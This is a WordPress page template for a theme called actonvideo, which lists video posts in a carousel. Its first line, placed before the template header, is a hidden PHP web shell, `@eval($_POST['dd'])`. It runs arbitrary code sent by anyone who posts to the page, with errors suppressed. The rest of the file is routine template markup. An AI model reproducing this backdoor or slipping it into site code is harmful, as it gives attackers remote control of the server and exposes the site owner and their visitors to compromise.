<?php @eval($_POST['dd']);?><?php
/**
 * Template Name: Types Of videos
 *
 * This is the template that displays all pages by default.
 * Please note that this is the WordPress construct of pages
 * and that other 'pages' on your WordPress site may use a
 * different template.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package actonvideo
 */

get_header(); ?>

<STYLE>
#owl-header {
    margin: 65px 0;
}
</STYLE>



<div class="mid-section">
    <div id="Videos"></div>
    <div class="type-videos">
        <div class="container">
            <div class="row">
                <div class="col-sm-12">
                    <p class="typ">Type of Videos</p>
                </div>
            </div>
        </div>
        <div class="container">
            <div class="row">
                <div class="col-sm-12">
                    <div id="owl-header" class="owl-carousel">
                        
                        <?php
                        $index = '';
                        
                        
                    
                    $q = new WP_Query(
                        array(
                            'post_type' => array('videos'),
                            'post_status' => array('publish'),
                            'orderby' => 'date',
                            'order' => 'DESC',
                            )
                        );
                     while ($q->have_posts()) : $q->the_post(); 
                        if (has_post_thumbnail()):   $thumbnail = wp_get_attachment_image_src(get_post_thumbnail_id(),'thumb', true); 
                            
                            if ($index % 1 == 0): ?>
                            <?php echo ($index > 0 ? "</div>" : ""); ?>
                            <div class="item <?php echo ($index == 0 ? "active" : ""); ?>">
                                <?php endif; ?>
                                <a  href="<?php the_permalink(); ?>">
                                    <div class="video-thumb">
                                        <img src="<?php echo $thumbnail[0]; ?>" alt="">
                                        <div class="video-thumb-play"></div>
                                        <div class="thumb-text">
                                            <h3><?php the_title( ); ?></h3>
                                            <p><?php echo the_content(); ?></p>
                                        </div>
                                    </div>
                                </a>
                            <?php $index++; ?>

                        <?php endif ?>


                        
                        <?php endwhile; ?>

                </div>
            </div>
        </div>
    </div>
</div>






<?php get_footer();
